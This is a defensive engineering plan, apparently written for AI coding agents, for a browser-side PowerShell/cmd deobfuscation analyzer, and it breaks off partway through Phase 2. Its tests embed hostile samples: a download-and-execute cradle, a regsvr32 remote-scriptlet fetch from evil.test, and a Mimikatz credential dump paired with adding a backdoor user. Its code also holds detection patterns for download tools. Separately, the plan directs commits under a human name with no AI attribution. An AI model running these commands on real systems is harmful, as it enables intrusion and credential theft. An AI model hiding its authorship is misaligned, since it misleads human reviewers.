# Analyzer Hardening Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Close the eight findings of the 2026-08-24 external analyzer review so the PowerShell/cmd translator never renders blank on input it could not process, never fabricates behavior, decodes the common second stages, and covers the named detection gaps — without weakening any existing doctrine.

**Architecture:** Opaque-residue-detector-first (ships the "no blank" safety property in Phase 1), then incremental decoders that shrink the opaque set (Phase 2), then detection-rule additions (Phase 3), then cmd deobfuscation + robustness + IOC hygiene (Phase 4). Everything is pure, DOM-free TypeScript in `shared/analyzer/` (plus one shared UI band and two `shared/`-level guards); reuses the existing `DecodedLayer{state:'opaque'}` machinery.

**Tech Stack:** TypeScript, React 19, Vitest (node env, auto-globbed by `web/vitest.config.ts` for `../shared/**/*.test.ts`), Web Compression Streams API.

**Spec:** `docs/superpowers/specs/2026-08-24-analyzer-hardening-design.md`

## Global Constraints

- **100% client-side, deterministic. No LLM. Never executes input.** No `eval`/`new Function`/dynamic dispatch of the pasted script (CSP `script-src 'self'`, no `unsafe-eval`).
- **Specificity-gated characterization.** Only an *intrinsically* near-dispositive rule (`baseSpecificity: 'near-dispositive'`, no legitimate use) earns "high-confidence malicious"; a strong signal upgraded by company stays "suspicious — review". `report.ts:232-253` reads BASE specificity, not upgraded — declare `baseSpecificity` honestly.
- **Benign-twin discipline.** Every risky rule carries a discriminator its benign twin fails; ship the twin as a negative test.
- **Honesty is first-class.** Silent partial success is the cardinal sin.
- **Reserved-colour law** (`shared/ui/Chip.tsx`): the partial-decode notice is neutral/periwinkle — never red/amber/green (those stay earned verdict severity).
- **Data boundary:** a pasted command never leaves the browser; the only egress is the analyst-clicked same-origin `/api/enrich`. Phase 4 tightens this, never loosens it.
- **Commits** `feat(analyzer):` / `fix(analyzer):` as author **SaltyCarl**, **zero AI/tool attribution** anywhere (message, trailer, comment, doc).
- **Branch:** a fresh `feat/analyzer-hardening` off `main`, created at execution start (the spec already sits committed on `feat/ransomware-profile-rebuild`; cherry-pick or copy it onto the new branch if not present).
- **QA gate each phase:** `npm --prefix web run build` (tsc -b) + `cd web && npx vitest run ../shared` + `npx vitest run src` all green; each fix has a test that fails without it.
- **Never restate:** run tests with `cd web && npx vitest run ../shared/analyzer/__tests__/<file> -t "<name>"`.

---

## Phase 1 — Failure legibility + honest narratives

### Task 1: Opaque-residue detector module

**Files:**
- Create: `shared/analyzer/residue.ts`
- Test: `shared/analyzer/__tests__/residue.test.ts`

**Interfaces:**
- Consumes: `tokenize`, `stringLiterals` from `./lex`; `looksBase64` from `./fold`; `Interpreter` from `./preprocess`.
- Produces: `export interface ResidueFinding { construct: string; note: string; bytes: number; entropy: number }` and `export function detectResidue(text: string, interpreter: Interpreter): ResidueFinding[]`. Returns one finding per distinct unresolved construct (deduped by `construct`), empty array when the text is clean.

- [ ] **Step 1: Write the failing test**

```typescript
// shared/analyzer/__tests__/residue.test.ts
import { describe, it, expect } from 'vitest'
import { detectResidue } from '../residue'

describe('detectResidue — unresolved constructs become findings', () => {
  it('R1: a base64 literal fed to a decode API is flagged', () => {
    const t = "IEX([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SW52b2tlLU1pbWlrYXR6IC1EdW1wQ3JlZHM=')))"
    const r = detectResidue(t, 'powershell')
    expect(r.map((f) => f.construct)).toContain('base64')
    expect(r[0].bytes).toBeGreaterThan(0)
  })
  it('R2: a dynamic sink over an unresolved -join/[char] construct is flagged', () => {
    const t = "IEX (( [char]73,[char]69,[char]88 ) -join '')"
    expect(detectResidue(t, 'powershell').map((f) => f.construct)).toContain('char-assembly')
  })
  it('R4: a cmd %VAR:~n,m% substring construct is flagged (cmd interpreter only)', () => {
    const t = '%COMSPEC:~0,1%'
    expect(detectResidue(t, 'cmd').map((f) => f.construct)).toContain('cmd-var')
  })

  // benign twins — MUST stay silent
  it('does not fire on a plain fetch cradle (download-cradle handles it)', () => {
    const t = "IEX (New-Object Net.WebClient).DownloadString('http://x.test/a.ps1')"
    expect(detectResidue(t, 'powershell')).toEqual([])
  })
  it('does not fire on an already-resolved literal executed by IEX', () => {
    expect(detectResidue("IEX 'Get-Process'", 'powershell')).toEqual([])
  })
  it('does not fire on benign admin work', () => {
    expect(detectResidue('Get-ChildItem -Recurse | Where Length -gt 1MB', 'powershell')).toEqual([])
  })
  it('does not fire on a bare %PATH% (not a substring/reassembly construct)', () => {
    expect(detectResidue('echo %PATH%', 'cmd')).toEqual([])
  })
})
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd web && npx vitest run ../shared/analyzer/__tests__/residue.test.ts`
Expected: FAIL — `Cannot find module '../residue'`.

- [ ] **Step 3: Write minimal implementation**

```typescript
// shared/analyzer/residue.ts
import { tokenize, stringLiterals } from './lex'
import { looksBase64 } from './fold'
import type { Interpreter } from './preprocess'

export interface ResidueFinding {
  construct: string   // 'base64' | 'char-assembly' | 'dynamic-exec' | 'cmd-var'
  note: string
  bytes: number
  entropy: number
}

/** Shannon entropy (bits/char) of a string — a residual-blob honesty stat. */
function entropy(s: string): number {
  if (!s) return 0
  const freq = new Map<string, number>()
  for (const ch of s) freq.set(ch, (freq.get(ch) ?? 0) + 1)
  let h = 0
  for (const c of freq.values()) { const p = c / s.length; h -= p * Math.log2(p) }
  return Math.round(h * 100) / 100
}

const DECODE_API = /frombase64string|\[convert\]::from|::frombase64/i
const SINK = /\biex\b|invoke-expression|\.invoke\(|(?:^|\s)&\s*\(/i
const CHAR_ASM = /\[char(?:\[\])?\]|\[array\]::reverse/i
const FMT_REPLACE = /-f\b|-replace\b|\.replace\(/i
const GETSTRING = /getstring/i
const FETCH_HINT = /downloadstring|downloaddata|invoke-webrequest|net\.webclient|iwr\b|irm\b/i

/** Scan the DEEPEST decoded text for encoding constructs that produced no
 *  decode layer — the honesty spine (spec §4.1). Each finding becomes an
 *  opaque DecodedLayer + an opaque bullet in analyze(). Conservative by
 *  design: every rule carries a benign-twin discriminator so an honest
 *  "opaque, escalate" never becomes cry-wolf. Deduped by construct. */
export function detectResidue(text: string, interpreter: Interpreter): ResidueFinding[] {
  const out: ResidueFinding[] = []
  const push = (construct: string, note: string, sample: string) => {
    if (out.some((f) => f.construct === construct)) return
    out.push({ construct, note, bytes: sample.replace(/\s+/g, '').length, entropy: entropy(sample) })
  }
  const lits = stringLiterals(tokenize(text))

  // R1 — a base64 literal handed to a decode API but not decoded into a layer.
  if (DECODE_API.test(text)) {
    const b64 = lits.find((l) => l.replace(/\s+/g, '').length >= 16 && looksBase64(l))
    if (b64) push('base64', 'a Base64 blob passed to a decode API could not be decoded', b64)
  }

  // R2/R3 — a dynamic-exec sink over a still-unresolved obfuscation construct.
  // Excludes a plain network fetch operand (that is download-cradle's job).
  if (SINK.test(text) && !FETCH_HINT.test(text)) {
    if (CHAR_ASM.test(text)) push('char-assembly', 'a [char]/-join character-assembly construct feeding execution could not be resolved', text)
    else if (FMT_REPLACE.test(text) || GETSTRING.test(text)) push('dynamic-exec', 'an obfuscated string feeding execution could not be resolved', text)
  }

  // R4 — cmd variable substring/reassembly (cmd interpreter path only).
  if (interpreter === 'cmd') {
    const sub = text.match(/%[A-Za-z_][\w]*:~\d+(?:,-?\d+)?%/)
    if (sub) push('cmd-var', 'a cmd %VAR:~n,m% substring construct could not be resolved', sub[0])
  }

  return out
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `cd web && npx vitest run ../shared/analyzer/__tests__/residue.test.ts`
Expected: PASS (7 tests).

- [ ] **Step 5: Commit**

```bash
git add shared/analyzer/residue.ts shared/analyzer/__tests__/residue.test.ts
git commit -m "feat(analyzer): opaque-residue detector for unresolved constructs"
```

---

### Task 2: Wire residue into analyze() — opaque layers + bullets + partial state

**Files:**
- Modify: `shared/analyzer/report.ts` (imports at top; insert after `deriveBullets` at line 205, before the `fullyDecoded` count at line 207)
- Test: `shared/analyzer/__tests__/report.test.ts` (append)

**Interfaces:**
- Consumes: `detectResidue`, `ResidueFinding` from `./residue`.
- Produces: no signature change to `analyze()`. Side effect: on residue, `result.layers` gains opaque entries, `result.bullets` gains opaque entries, `result.confidence.state === 'partial'`.

- [ ] **Step 1: Write the failing test**

```typescript
// append to shared/analyzer/__tests__/report.test.ts
describe('analyze — failure legibility (residue)', () => {
  it('a plain-base64 inner stage renders an opaque partial, never blank', async () => {
    const b64 = btoa('Invoke-Mimikatz -DumpCreds; net user hacker P@ss /add')
    const r = await analyze(`IEX([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('${b64}')))`)
    expect(r.confidence.state).toBe('partial')
    expect(r.layers.some((l) => l.state === 'opaque')).toBe(true)
    expect(r.bullets.some((b) => b.confidence === 'opaque')).toBe(true)
  })
  it('benign admin work stays fully-decoded and silent', async () => {
    const r = await analyze('Get-ChildItem -Recurse | Where Length -gt 1MB | Sort | Select')
    expect(r.confidence.state).toBe('fully-decoded')
    expect(r.layers.some((l) => l.state === 'opaque')).toBe(false)
  })
})
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd web && npx vitest run ../shared/analyzer/__tests__/report.test.ts -t "failure legibility"`
Expected: FAIL — state is `fully-decoded` and no opaque layer (blank case reproduced).

- [ ] **Step 3: Write minimal implementation**

Add the import near line 8:

```typescript
import { detectResidue } from './residue'
```

Insert immediately after line 205 (`const bullets = deriveBullets(...)`), before line 207 (`const fullyDecoded = ...`):

```typescript
  // Failure legibility (spec §4.1): scan the DEEPEST decoded text for encoding
  // constructs that produced no layer. Each becomes an opaque layer (flips
  // confidence.state to 'partial' via the count below) + an opaque bullet in
  // the "Could not resolve" block — so an unopenable stager never renders
  // identically to a benign one-liner.
  const deepestText = [...layers].reverse().find((l) => l.text != null)?.text ?? script
  for (const res of detectResidue(deepestText, interpreter)) {
    layers.push({
      index: layers.length,
      transform: `unresolved ${res.construct}`,
      text: null,
      state: 'opaque',
      residual: { bytes: res.bytes, entropy: res.entropy, note: res.note },
    })
    bullets.push({
      order: bullets.length + 1,
      verb: 'Contains',
      text: `${res.note} — treat as opaque and escalate for manual review.`,
      confidence: 'opaque',
      iocs: [],
      techniqueIds: [],
    })
  }
```

- [ ] **Step 4: Run test to verify it passes**

Run: `cd web && npx vitest run ../shared/analyzer/__tests__/report.test.ts`
Expected: PASS (existing + 2 new).

- [ ] **Step 5: Commit**

```bash
git add shared/analyzer/report.ts shared/analyzer/__tests__/report.test.ts
git commit -m "feat(analyzer): render unresolved constructs as opaque partials, never blank"
```

---

### Task 3: PartialDecodeNotice UI band

**Files:**
- Create: `shared/analyzer-ui/PartialDecodeNotice.tsx`
- Modify: `shared/analyzer-ui/AnalyzerResult.tsx:16-31`, `shared/analyzer-ui/index.ts`
- Test: `shared/analyzer-ui/__tests__/PartialDecodeNotice.test.tsx`

**Interfaces:**
- Consumes: `AnalysisResult['confidence']`.
- Produces: `export function PartialDecodeNotice({ state }: { state: DecodeState }): JSX.Element | null` — renders only when `state === 'partial'`.

- [ ] **Step 1: Write the failing test**

```typescript
// shared/analyzer-ui/__tests__/PartialDecodeNotice.test.tsx
import { describe, it, expect } from 'vitest'
import { renderToStaticMarkup } from 'react-dom/server'
import { PartialDecodeNotice } from '../PartialDecodeNotice'

describe('PartialDecodeNotice', () => {
  it('renders an escalation band when state is partial', () => {
    const html = renderToStaticMarkup(<PartialDecodeNotice state="partial" />)
    expect(html).toMatch(/partially decoded/i)
    expect(html).toMatch(/escalate/i)
  })
  it('renders nothing when fully decoded', () => {
    expect(renderToStaticMarkup(<PartialDecodeNotice state="fully-decoded" />)).toBe('')
  })
})
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd web && npx vitest run ../shared/analyzer-ui/__tests__/PartialDecodeNotice.test.tsx`
Expected: FAIL — module not found.

- [ ] **Step 3: Write minimal implementation**

```tsx
// shared/analyzer-ui/PartialDecodeNotice.tsx
import type { DecodeState } from '@socdesk/shared/analyzer'
import { MicroLabel } from '@socdesk/shared/ui'

/** Honesty band (spec §4.2): shown when the analyzer could not fully resolve
 *  the input. Reserved-colour law — NEUTRAL/periwinkle, never red/amber: this
 *  is a "we could not open it" fact (gray-means-unknown), not an earned
 *  severity verdict. */
export function PartialDecodeNotice({ state }: { state: DecodeState }) {
  if (state !== 'partial') return null
  return (
    <div className="rounded-md border border-line bg-panel-soft/40 p-3">
      <MicroLabel tone="muted">Partially decoded</MicroLabel>
      <p className="mt-1 text-xs text-muted">
        An inner construct could not be resolved. A thin result here is not a clean result — escalate for manual review.
      </p>
    </div>
  )
}
```

Wire into `AnalyzerResult.tsx` — add the import and render it directly under `TechniqueTally` (line 26):

```tsx
import { PartialDecodeNotice } from './PartialDecodeNotice'
// ...
      <TechniqueTally signals={result.signals} characterization={result.characterization} />
      <PartialDecodeNotice state={result.confidence.state} />
      <ActionBullets bullets={result.bullets} />
```

Add to `shared/analyzer-ui/index.ts`:

```typescript
export { PartialDecodeNotice } from './PartialDecodeNotice'
```

- [ ] **Step 4: Run test to verify it passes**

Run: `cd web && npx vitest run ../shared/analyzer-ui/__tests__/PartialDecodeNotice.test.tsx`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add shared/analyzer-ui/PartialDecodeNotice.tsx shared/analyzer-ui/AnalyzerResult.tsx shared/analyzer-ui/index.ts shared/analyzer-ui/__tests__/PartialDecodeNotice.test.tsx
git commit -m "feat(analyzer): partial-decode escalation notice on the shared result surface"
```

---

### Task 4: LOLBin context-token curation (kill benign over-fire)

**Files:**
- Modify: `shared/analyzer/lolbins.ts:15-22`
- Test: `shared/analyzer/__tests__/lolbins.test.ts` (append)

**Interfaces:**
- Consumes: nothing new.
- Produces: `LOLBINS` table with tightened `context` arrays. `matchLolbin` signature unchanged.

- [ ] **Step 1: Write the failing test**

```typescript
// append to shared/analyzer/__tests__/lolbins.test.ts
import { buildContext } from '../techniques'
const ctxFor = (s: string) => buildContext(s, [], 'unknown')

describe('LOLBin benign-twin discipline (review 2.3)', () => {
  it('benign regsvr32 /u /s <local dll> does NOT match', () => {
    expect(matchLolbin(ctxFor('regsvr32 /u /s C:\\Program Files\\MyApp\\shell-extension.dll')).hit).toBe(false)
  })
  it('real Squiblydoo (regsvr32 /i:http scrobj) still matches', () => {
    expect(matchLolbin(ctxFor('regsvr32 /s /n /u /i:http://evil.test/a.sct scrobj.dll')).hit).toBe(true)
  })
  it('benign rundll32 shell32.dll,Control_RunDLL does NOT match', () => {
    expect(matchLolbin(ctxFor('rundll32.exe shell32.dll,Control_RunDLL')).hit).toBe(false)
  })
  it('benign msiexec /i app.msi /qn does NOT match', () => {
    expect(matchLolbin(ctxFor('msiexec /i app.msi /qn')).hit).toBe(false)
  })
  it('benign installutil app.exe does NOT match', () => {
    expect(matchLolbin(ctxFor('installutil /u C:\\app\\thing.exe')).hit).toBe(false)
  })
})
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd web && npx vitest run ../shared/analyzer/__tests__/lolbins.test.ts -t "benign-twin"`
Expected: FAIL — the regsvr32/rundll32/msiexec/installutil benign cases currently match.

- [ ] **Step 3: Write minimal implementation**

Replace the four entries in `lolbins.ts` (lines 18-22 region):

```typescript
  { bin: 'regsvr32', context: ['/i:http', 'scrobj', 'http://', 'https://'], techniqueIds: ['T1218.010'] },
  { bin: 'rundll32', context: ['javascript:', 'url.dll,fileprotocolhandler', 'mshtml,runhtmlapplication'], techniqueIds: ['T1218.011'] },
  { bin: 'msiexec', context: ['/i http', '/i https', '/package http'], techniqueIds: ['T1218.007'] },
  { bin: 'wmic', context: ['process call create', '/node:', 'format:http'], techniqueIds: ['T1047'] },
  { bin: 'installutil', context: ['/logfile=', 'logtoconsole'], techniqueIds: ['T1218.004'] },
```

(Note: `wmic` is unchanged — re-listed only for positional clarity; do not duplicate it.)

- [ ] **Step 4: Run test to verify it passes**

Run: `cd web && npx vitest run ../shared/analyzer/__tests__/lolbins.test.ts`
Expected: PASS (existing + new). If an existing positive test used a now-dropped token (e.g. a bare `/u`), update it to a real abuse cmdline.

- [ ] **Step 5: Commit**

```bash
git add shared/analyzer/lolbins.ts shared/analyzer/__tests__/lolbins.test.ts
git commit -m "fix(analyzer): gate regsvr32/rundll32/msiexec/installutil on real abuse args"
```

---

### Task 5: Variant-aware regsvr32/rundll32 bullets (kill the fabrication)

**Files:**
- Modify: `shared/analyzer/bullets.ts:544-569` (the `lolbin-regsvr32` and `lolbin-rundll32` rules)
- Test: `shared/analyzer/__tests__/bullets.test.ts` (append)

**Interfaces:**
- Consumes: `BulletContext` (already has `ctx.lower`/`ctx.words`).
- Produces: the two rules' `fires()`/`render()` now branch on the resolved abuse sub-fact; emit only what matched.

- [ ] **Step 1: Write the failing test**

```typescript
// append to shared/analyzer/__tests__/bullets.test.ts
import { analyze } from '../report'

describe('LOLBin narrative no-invent (review 2.3, sample 7)', () => {
  it('benign regsvr32 /u produces NO regsvr32 bullet', async () => {
    const r = await analyze('regsvr32 /u /s C:\\Program Files\\MyApp\\shell-extension.dll')
    expect(r.bullets.some((b) => /regsvr32/i.test(b.text))).toBe(false)
  })
  it('real Squiblydoo produces the Squiblydoo bullet', async () => {
    const r = await analyze('regsvr32 /s /n /u /i:http://evil.test/a.sct scrobj.dll')
    expect(r.bullets.some((b) => /squiblydoo/i.test(b.text))).toBe(true)
  })
})
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd web && npx vitest run ../shared/analyzer/__tests__/bullets.test.ts -t "no-invent"`
Expected: FIRST test fails — after Task 4 the benign case yields no signal so likely already no bullet; if the fixture still emits, this catches it. SECOND must pass. (If the first already passes post-Task-4, keep the test as a regression guard and proceed.)

- [ ] **Step 3: Write minimal implementation**

Replace the `lolbin-regsvr32` rule (bullets.ts:545-556) with a variant-aware version:

```typescript
  {
    id: 'lolbin-regsvr32',
    requiredFacts: ['signal: lolbin (regsvr32)'],
    family: 'fetch',
    fires(ctx) {
      const s = ctx.signals.find((x) => x.id === 'lolbin' && x.trigger === 'regsvr32')
      if (!s) return null
      const squiblydoo = /\/i:http/i.test(ctx.lower) || ctx.lower.includes('scrobj')
      return { layerIndex: 0, confidence: 'resolved', iocs: [], techniqueIds: s.techniqueIds, vars: { squiblydoo: squiblydoo ? '1' : '' } }
    },
    render(m) {
      return m.vars.squiblydoo
        ? { verb: 'Executes', text: 'Executes a remote scriptlet via regsvr32 (Squiblydoo)' }
        : { verb: 'Executes', text: 'Executes regsvr32 against a remote target' }
    },
  },
```

Replace the `lolbin-rundll32` rule (bullets.ts:558-568) likewise:

```typescript
  {
    id: 'lolbin-rundll32',
    requiredFacts: ['signal: lolbin (rundll32)'],
    family: 'fetch',
    fires(ctx) {
      const s = ctx.signals.find((x) => x.id === 'lolbin' && x.trigger === 'rundll32')
      if (!s) return null
      return { layerIndex: 0, confidence: 'resolved', iocs: [], techniqueIds: s.techniqueIds, vars: {} }
    },
    render() {
      return { verb: 'Executes', text: 'Executes code via a rundll32 proxy invocation' }
    },
  },
```

- [ ] **Step 4: Run test to verify it passes**

Run: `cd web && npx vitest run ../shared/analyzer/__tests__/bullets.test.ts`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add shared/analyzer/bullets.ts shared/analyzer/__tests__/bullets.test.ts
git commit -m "fix(analyzer): regsvr32/rundll32 bullets state only what matched (no Squiblydoo invention)"
```

---

### Task 6: Review-samples ratcheting integration fixture

**Files:**
- Create: `shared/analyzer/__tests__/review-samples.test.ts`

**Interfaces:**
- Consumes: `analyze` from `../report`.
- Produces: the 7 review inputs pinned as the ratcheting fixture (updated by later phases).

- [ ] **Step 1: Write the test (this is the deliverable — it encodes Phase-1 expected state)**

```typescript
// shared/analyzer/__tests__/review-samples.test.ts
import { describe, it, expect } from 'vitest'
import { analyze } from '../report'

// The 7 samples from SOCDesk-Analyzer-Review-2026-08-24.pdf. Expected values
// RATCHET as phases land — a change here is intentional, never silent.
describe('review battery — end state after Phase 1', () => {
  it('#2 benign Get-ChildItem: silent, fully-decoded', async () => {
    const r = await analyze('Get-ChildItem -Recurse | Where Length -gt 1MB | Sort | Select')
    expect(r.signals).toEqual([])
    expect(r.confidence.state).toBe('fully-decoded')
  })
  it('#6 plain-base64 inner stage: opaque partial (NOT blank) — ratchets to decoded in Phase 2', async () => {
    const b64 = btoa('Invoke-Mimikatz -DumpCreds; net user hacker P@ss /add')
    const r = await analyze(`IEX([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('${b64}')))`)
    expect(r.confidence.state).toBe('partial')
    expect(r.layers.some((l) => l.state === 'opaque')).toBe(true)
  })
  it('#7 benign regsvr32 /u: no fabricated narrative', async () => {
    const r = await analyze('regsvr32 /u /s C:\\Program Files\\MyApp\\shell-extension.dll')
    expect(r.bullets.some((b) => /squiblydoo|remote script/i.test(b.text))).toBe(false)
  })
})
```

- [ ] **Step 2: Run to verify it passes (all deps already implemented in Tasks 1-5)**

Run: `cd web && npx vitest run ../shared/analyzer/__tests__/review-samples.test.ts`
Expected: PASS.

- [ ] **Step 3: Full Phase-1 gate**

Run: `npm --prefix web run build && cd web && npx vitest run ../shared && npx vitest run src`
Expected: all green.

- [ ] **Step 4: Commit**

```bash
git add shared/analyzer/__tests__/review-samples.test.ts
git commit -m "test(analyzer): pin the 7-sample review battery as a ratcheting fixture"
```

- [ ] **Step 5: Note-taking checkpoint**

Invoke the `nt` agent to append a Phase-1 block to `docs/HANDOFF.md` (features shipped, files, commits, gate status).

---

## Phase 2 — Decode-ladder expansion

### Task 7: Plain base64 → text decoder (the 2.1 fix)

**Files:**
- Modify: `shared/analyzer/report.ts:154-165` (the embedded-literal inflate loop)
- Test: `shared/analyzer/__tests__/report.test.ts` (append)

**Interfaces:**
- Consumes: `fromBase64`, `bytesToText`, `looksBase64` (already imported at report.ts:4).
- Produces: an added `Base64 → text (UTF-8|UTF-16LE)` layer when an embedded base64 literal decodes to printable text and no inflate applied.

- [ ] **Step 1: Write the failing test**

```typescript
// append to shared/analyzer/__tests__/report.test.ts
describe('analyze — plain base64 inner stage (review 2.1)', () => {
  it('decodes a non-compressed base64 blob to text and characterizes it', async () => {
    const b64 = btoa('Invoke-Mimikatz -DumpCreds; net user hacker P@ss /add')
    const r = await analyze(`IEX([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('${b64}')))`)
    expect(r.layers.some((l) => /Base64 → text/.test(l.transform) && (l.text ?? '').includes('Invoke-Mimikatz'))).toBe(true)
    expect(r.confidence.state).toBe('fully-decoded')
  })
})
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd web && npx vitest run ../shared/analyzer/__tests__/report.test.ts -t "plain base64 inner"`
Expected: FAIL — no `Base64 → text` layer; state still `partial`.

- [ ] **Step 3: Write minimal implementation**

Add a UTF-16LE sniff helper near `isMostlyPrintable` (report.ts:353):

```typescript
/** Pick text encoding for a decoded byte array: UTF-16LE if a high share of
 *  odd-index bytes are NUL (the -enc gotcha), else UTF-8. */
function bytesToTextSmart(bytes: Uint8Array): string {
  let oddNul = 0, oddCount = 0
  for (let i = 1; i < bytes.length; i += 2) { oddCount++; if (bytes[i] === 0) oddNul++ }
  const enc = oddCount > 0 && oddNul / oddCount > 0.3 ? 'utf-16le' : 'utf-8'
  return new TextDecoder(enc, { fatal: false }).decode(bytes)
}
```

Replace the embedded-literal loop body (report.ts:155-165):

```typescript
  for (const lit of stringLiterals(tokenize(current))) {
    if (!looksBase64(lit)) continue
    const bytes = fromBase64(lit)
    const inflated = await inflate(bytes)
    if (inflated) {
      const text = bytesToText(inflated)
      if (isMostlyPrintable(text)) {
        layers.push({ index: layers.length, transform: 'Base64 → inflate', text, state: 'fully-decoded' })
        break
      }
    }
    // Plain (non-compressed) base64 → text. Gated: decode-API co-occurs OR the
    // blob is long enough that a coincidental base64-shaped bareword is
    // implausible. Non-printable result is NOT a layer — it falls to the
    // residue detector (honest "decodes to non-text").
    const decodeApiPresent = /frombase64string|\[convert\]::from/i.test(current)
    if (decodeApiPresent || lit.replace(/\s+/g, '').length >= 32) {
      const text = bytesToTextSmart(bytes)
      if (isMostlyPrintable(text)) {
        const enc = /\u0000/.test(new TextDecoder('latin1').decode(bytes.subarray(0, 4))) ? 'UTF-16LE' : 'UTF-8'
        layers.push({ index: layers.length, transform: `Base64 → text (${enc})`, text, state: 'fully-decoded' })
        break
      }
    }
  }
```

- [ ] **Step 4: Run test to verify it passes**

Run: `cd web && npx vitest run ../shared/analyzer/__tests__/report.test.ts`
Expected: PASS. The decoded text now flows into the scan corpus → IOCs/signals downstream.

- [ ] **Step 5: Update the ratchet + commit**

In `review-samples.test.ts`, change the `#6` expectation from opaque-partial to decoded:

```typescript
  it('#6 plain-base64 inner stage: now DECODED (Phase 2)', async () => {
    const b64 = btoa('Invoke-Mimikatz -DumpCreds; net user hacker P@ss /add')
    const r = await analyze(`IEX([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('${b64}')))`)
    expect(r.layers.some((l) => /Base64 → text/.test(l.transform))).toBe(true)
    expect(r.confidence.state).toBe('fully-decoded')
  })
```

```bash
git add shared/analyzer/report.ts shared/analyzer/__tests__/report.test.ts shared/analyzer/__tests__/review-samples.test.ts
git commit -m "feat(analyzer): decode plain (non-compressed) base64 inner stages to text"
```

---

### Task 8: `[char]` / numeric `-join` constant fold

**Files:**
- Modify: `shared/analyzer/resolve.ts` (add a fold pass into the `resolve()` fixpoint at line 95)
- Test: `shared/analyzer/__tests__/resolve.test.ts` (append)

**Interfaces:**
- Consumes: `tokenize` (already imported).
- Produces: `export function foldCharArray(text: string): string` — folds `[char]NN` and `([char]NN,[char]MM,…) -join ''` to their literal string; called inside `resolve()`.

- [ ] **Step 1: Write the failing test**

```typescript
// append to shared/analyzer/__tests__/resolve.test.ts
import { resolve } from '../resolve'
describe('resolve — [char]/-join assembly (review 2.5)', () => {
  it('folds a [char] number to its character', () => {
    expect(resolve('[char]73')).toContain('I')
  })
  it('folds a joined [char] array to a literal', () => {
    expect(resolve("([char]73,[char]69,[char]88) -join ''")).toContain('IEX')
  })
  it('leaves a non-literal join untouched', () => {
    const t = "$x -join ','"
    expect(resolve(t)).toContain('$x')
  })
})
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd web && npx vitest run ../shared/analyzer/__tests__/resolve.test.ts -t "char"`
Expected: FAIL — `[char]73` passes through unchanged.

- [ ] **Step 3: Write minimal implementation**

Add to `resolve.ts` (regex passes over raw text, literal-safe because these constructs live outside string quotes):

```typescript
/** Fold `[char]NN` → its character and `([char]A,[char]B,…) -join ''` → the
 *  assembled literal. Numeric literals only — a `[char]$x` with a variable is
 *  left untouched (never guessed). */
export function foldCharArray(text: string): string {
  // ([char]73,[char]69,...) -join '' | "" → 'IEX'
  const joined = text.replace(
    /\(\s*((?:\[char\]\s*\d+\s*,\s*)+\[char\]\s*\d+)\s*\)\s*-join\s*(?:''|"")/gi,
    (_m, body: string) => {
      const codes = [...body.matchAll(/\[char\]\s*(\d+)/gi)].map((x) => Number(x[1]))
      const s = String.fromCharCode(...codes).replace(/'/g, "''")
      return `'${s}'`
    },
  )
  // bare [char]73 → 'I'
  return joined.replace(/\[char\]\s*(\d+)/gi, (_m, n: string) => `'${String.fromCharCode(Number(n)).replace(/'/g, "''")}'`)
}
```

Fold it into the `resolve()` fixpoint (line 95):

```typescript
    const next = foldConcat(foldCharArray(resolveVars(cur)))
```

- [ ] **Step 4: Run test to verify it passes**

Run: `cd web && npx vitest run ../shared/analyzer/__tests__/resolve.test.ts`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add shared/analyzer/resolve.ts shared/analyzer/__tests__/resolve.test.ts
git commit -m "feat(analyzer): fold [char] and numeric -join assembly"
```

---

### Task 9: `-f` format-operator fold

**Files:**
- Modify: `shared/analyzer/resolve.ts`
- Test: `shared/analyzer/__tests__/resolve.test.ts` (append)

**Interfaces:**
- Produces: `export function foldFormat(text: string): string` — folds `'{0}{1}' -f 'a','b'` to `'ab'`; plain `{N}` placeholders only.

- [ ] **Step 1: Write the failing test**

```typescript
describe('resolve — -f format operator (review 2.5)', () => {
  it('folds a literal format string + literal args', () => {
    expect(resolve("('{0}{1}{2}' -f 'I','E','X')")).toContain('IEX')
  })
  it('leaves a variable-arg -f untouched', () => {
    expect(resolve("'{0}' -f $x")).toContain('$x')
  })
  it('leaves a format-spec placeholder untouched', () => {
    const t = "'{0:X2}' -f 255"
    expect(resolve(t)).toContain('{0:X2}')
  })
})
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd web && npx vitest run ../shared/analyzer/__tests__/resolve.test.ts -t "format operator"`
Expected: FAIL.

- [ ] **Step 3: Write minimal implementation**

```typescript
/** Fold `'{0}{1}' -f 'a','b'` → `'ab'`. Literal format string + literal args
 *  only; plain `{N}` placeholders only — a format-spec `{0:X2}` or a
 *  variable arg stops the fold (left untouched). */
export function foldFormat(text: string): string {
  return text.replace(
    /'((?:[^']|'')*)'\s*-f\s*((?:'(?:[^']|'')*'\s*,\s*)*'(?:[^']|'')*')/gi,
    (whole, fmt: string, argList: string) => {
      if (/\{\s*\d+\s*[:,]/.test(fmt)) return whole // format-spec present — do not fold
      const args = [...argList.matchAll(/'((?:[^']|'')*)'/g)].map((m) => m[1].replace(/''/g, "'"))
      let ok = true
      const outStr = fmt.replace(/''/g, "'").replace(/\{(\d+)\}/g, (_m, i: string) => {
        const v = args[Number(i)]
        if (v === undefined) { ok = false; return _m }
        return v
      })
      return ok ? `'${outStr.replace(/'/g, "''")}'` : whole
    },
  )
}
```

Chain into `resolve()`:

```typescript
    const next = foldConcat(foldFormat(foldCharArray(resolveVars(cur))))
```

- [ ] **Step 4: Run test to verify it passes**

Run: `cd web && npx vitest run ../shared/analyzer/__tests__/resolve.test.ts`
